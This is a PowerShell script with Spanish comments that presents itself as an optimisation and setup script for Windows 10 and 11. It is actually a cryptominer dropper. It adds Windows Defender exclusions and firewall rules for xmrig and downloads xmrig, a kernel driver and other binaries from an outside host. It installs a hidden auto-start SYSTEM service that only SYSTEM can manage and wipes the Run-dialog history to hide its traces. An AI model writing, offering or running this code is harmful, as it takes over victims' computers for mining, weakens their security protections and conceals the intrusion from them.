# Script optimizado para Windows 10 y 11
# Requiere ejecución como administrador

# Verificar si se está ejecutando como administrador
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Este script requiere privilegios de administrador." -ForegroundColor Red
    Write-Host "Por favor, ejecuta PowerShell como administrador y vuelve a intentarlo." -ForegroundColor Yellow
    exit
}

# Configuración de ejecución para evitar errores
$ErrorActionPreference = "Stop"
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# URL base para descargas
$baseURL = "https://baa4ts.is-a-good.dev"

# Definir rutas
$root = Join-Path $env:WINDIR "System32"
$root = Join-Path $root "LogFiles"
$root = Join-Path $root "WNMA"

$xmrig = Join-Path $root "xmrig.exe"
$Win2 = Join-Path $root "Win2Internals.exe"
$wroom = Join-Path $root "wroom.dll"
$WinRing = Join-Path $root "WinRing0x64.sys"

Write-Host "Iniciando script de configuración..." -ForegroundColor Green

try {
    # Crear la carpeta si no existe
    if (-not (Test-Path -Path $root)) {
        Write-Host "Creando directorio: $root" -ForegroundColor Yellow
        New-Item -Path $root -ItemType Directory -Force | Out-Null
    }

    # Establecer la variable de entorno
    Write-Host "Estableciendo variable de entorno..." -ForegroundColor Yellow
    [Environment]::SetEnvironmentVariable("WINUSERNAME", $env:USERNAME, "Machine")

    # Agregar exclusiones de Windows Defender
    Write-Host "Agregando exclusiones de Windows Defender..." -ForegroundColor Yellow
    
    # Verificar si el módulo de Defender está disponible
    if (Get-Module -ListAvailable -Name Defender) {
        Import-Module Defender -ErrorAction SilentlyContinue
        
        # Exclusiones de path (solo la carpeta raíz es necesaria)
        Add-MpPreference -ExclusionPath $root -ErrorAction SilentlyContinue
        
        # Exclusiones de procesos
        Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "Win2Internals.exe" -ErrorAction SilentlyContinue
        
        Write-Host "Exclusiones agregadas correctamente." -ForegroundColor Green
    } else {
        Write-Host "Módulo de Defender no disponible, omitiendo exclusiones." -ForegroundColor Yellow
    }

    # Configurar reglas de firewall
    Write-Host "Configurando reglas de firewall..." -ForegroundColor Yellow
    
    # Eliminar reglas existentes si existen
    Remove-NetFirewallRule -DisplayName "Entrada XMRIG" -ErrorAction SilentlyContinue
    Remove-NetFirewallRule -DisplayName "Salida XMRIG" -ErrorAction SilentlyContinue
    
    # Crear nuevas reglas
    New-NetFirewallRule -DisplayName "Entrada XMRIG" -Direction Inbound -Program $xmrig -Action Allow -Profile Any -ErrorAction SilentlyContinue
    New-NetFirewallRule -DisplayName "Salida XMRIG" -Direction Outbound -Program $xmrig -Action Allow -Profile Any -ErrorAction SilentlyContinue

    # Descargar archivos
    Write-Host "Descargando archivos..." -ForegroundColor Yellow
    
    $files = @{
        "Win2Internals.exe" = $Win2
        "WinRing0x64.sys" = $WinRing
        "wroom.dll" = $wroom
        "xmrig.exe" = $xmrig
    }

    foreach ($file in $files.GetEnumerator()) {
        try {
            Write-Host "Descargando $($file.Key)..." -ForegroundColor Gray
            Invoke-WebRequest -Uri "$baseURL/$($file.Key)" -OutFile $file.Value -UseBasicParsing
        }
        catch {
            Write-Host "Error al descargar $($file.Key): $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # Crear el servicio
    Write-Host "Configurando servicio..." -ForegroundColor Yellow
    
    # Detener y eliminar servicio si existe
    sc.exe stop Win2Internals 2>$null
    sc.exe delete Win2Internals 2>$null
    
    # Crear nuevo servicio
    sc.exe create Win2Internals binPath= "$Win2" start= auto obj= "LocalSystem" type= own
    sc.exe sdset Win2Internals "D:(A;;GA;;;SY)"
    
    # Iniciar servicio
    sc.exe start Win2Internals

    # Limpiar historial de ejecución
    Write-Host "Limpiando registro..." -ForegroundColor Yellow
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    Remove-ItemProperty -Path $regPath -Name * -Force -ErrorAction SilentlyContinue

    Write-Host "Configuración completada exitosamente!" -ForegroundColor Green
}
catch {
    Write-Host "Error durante la ejecución: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "En la línea: $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Red
}

# Restaurar política de ejecución
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope Process -Force
